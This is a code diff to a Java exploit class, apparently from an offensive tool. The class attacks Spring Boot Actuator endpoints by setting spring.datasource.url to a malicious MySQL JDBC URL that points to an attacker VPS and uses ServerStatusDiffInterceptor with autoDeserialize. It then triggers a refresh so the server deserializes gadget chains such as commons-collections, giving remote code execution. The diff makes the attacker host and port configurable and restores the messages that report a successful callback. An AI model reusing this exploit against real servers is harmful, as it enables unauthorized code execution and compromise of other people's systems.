@@ -25,8 +25,8 @@ public class MysqlJDBCRCE {
     public String text;
     public String expdata1 = "spring.datasource.url=%s";
     public String expdata2 = "{\"name\":\"spring.datasource.url\",\"value\":\"%s\"}";
-    public String mysql5tmp = "jdbc:mysql://%s:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
-    public String mysql8tmp = "jdbc:mysql://%s:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
+    public String mysql5tmp = "jdbc:mysql://%s:%s/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
+    public String mysql8tmp = "jdbc:mysql://%s:%s/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
     public MysqlJDBCRCE(String address, String vpsIP, String vpsPORT){
         this.address = address;
         this.vpsIP = vpsIP;
@@ -37,7 +37,7 @@ public class MysqlJDBCRCE {
 
     }
 
-    public void Result2( ){
+    public void Result2(){
         String llib = "spring-boot-starter-actuator";
         String api = "/actuator/env";
         String refapi = "/actuator/refresh";
@@ -63,6 +63,7 @@ public class MysqlJDBCRCE {
             while ((inputLine = in.readLine()) != null) {
                 response.append(inputLine);
             }
+            in.close();
             if (responseCode == HttpURLConnection.HTTP_OK && ((response.toString().contains(llib)) && (response.toString().contains(llib1)))) {
                 String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                 Pattern pattern = Pattern.compile(regex);
@@ -76,13 +77,8 @@ public class MysqlJDBCRCE {
 //                    callback.onResult(text);
                     text = String.format("mysql-connector-java 依赖为: %s", matcher1.group(1));
                     System.out.println(text);
-                    String mysqlVersion = matcher1.group(1).split("\\.")[0];
-                    if (mysqlVersion.equals("8")){
-                        data = String.format(expdata2,mysql8tmp);
-                    }else if (mysqlVersion.equals("5")){
-                        data = String.format(expdata2,mysql5tmp);
-                    }else {
-                        text = "未知mysql版本";
+                    if (response.toString().contains("commons-collections")||response.toString().contains("Jdk7u21")||response.toString().contains("Jdk8u20")){
+                        System.out.println("发现gadget有可能为:commons-collections、Jdk7u21、Jdk8u20" + "\n" + "请审查确认gadget后再使用ysoserial工具");
                     }
                     if (response.toString().contains("spring.datasource.url")){
                         String regex3 = "\"spring.datasource.url\"\\s*:\\s*\\{[^}]*\\}";
@@ -92,6 +88,16 @@ public class MysqlJDBCRCE {
                             text = "当前值为: " + matcher3.group();
                             System.out.println(text);
                         }
+                    }
+                    String mysqlVersion = matcher1.group(1).split("\\.")[0];
+                    if (mysqlVersion.equals("8")){
+                        String mysql8 = String.format(mysql8tmp,vpsIP,vpsPORT);
+                        data = String.format(expdata2,mysql8);
+                    }else if (mysqlVersion.equals("5")){
+                        String mysql5 = String.format(mysql5tmp,vpsIP,vpsPORT);
+                        data = String.format(expdata2,mysql5);
+                    }else {
+                        text = "未知mysql版本";
                     }
                     try {
                         URL obj1 = new URL(site);
@@ -116,18 +122,18 @@ public class MysqlJDBCRCE {
                                 conn2.setRequestMethod("POST");
                                 conn2.setDoOutput(true);
                                 int responseCode2 = conn2.getResponseCode();
-//                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
-//                                    text = "执行命令成功";
-//                                    System.out.println(text);
-////                                    callback.onResult(text);
-//                                    text = "当前反弹vpsIP: " + vpsIP + "vpsPort: 7777";
-//                                    System.out.println(text);
-////                                    callback.onResult(text);
-//                                } else {
-//                                    text = "错误：发送restart请求失败，状态码为: " + responseCode2;
-//                                    System.out.println(text);
-////                                    callback.onResult(text);
-//                                }
+                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
+                                    text = "执行命令成功,请访问一个带有SQL请求的接口，并在反弹服务器上查看";
+                                    System.out.println(text);
+//                                    callback.onResult(text);
+                                    text = "当前反弹vpsIP: " + vpsIP + "vpsPort: 7777";
+                                    System.out.println(text);
+//                                    callback.onResult(text);
+                                } else {
+                                    text = "发送请求失败，请重试";
+                                    System.out.println(text);
+//                                    callback.onResult(text);
+                                }
                             } catch (Exception e) {
                                 text = "异常：发起refresh请求失败";
                                 System.out.println(text);
@@ -136,7 +142,7 @@ public class MysqlJDBCRCE {
                             }
                         }
                     } catch (Exception e) {
-                        text = "发起env请求失败";
+                        text = "异常: 发起env请求失败";
                         System.out.println(text);
 //                        callback.onResult(text);
                         e.printStackTrace();
@@ -195,7 +201,7 @@ public class MysqlJDBCRCE {
     }
 
     public static void main(String[] args) {
-        MysqlJDBCRCE m = new MysqlJDBCRCE("http://127.0.0.1:9097/","127.0.0.1","80");
+        MysqlJDBCRCE m = new MysqlJDBCRCE("http://127.0.0.1:9097/","127.0.0.1","3307");
         m.Exp();
     }
 }
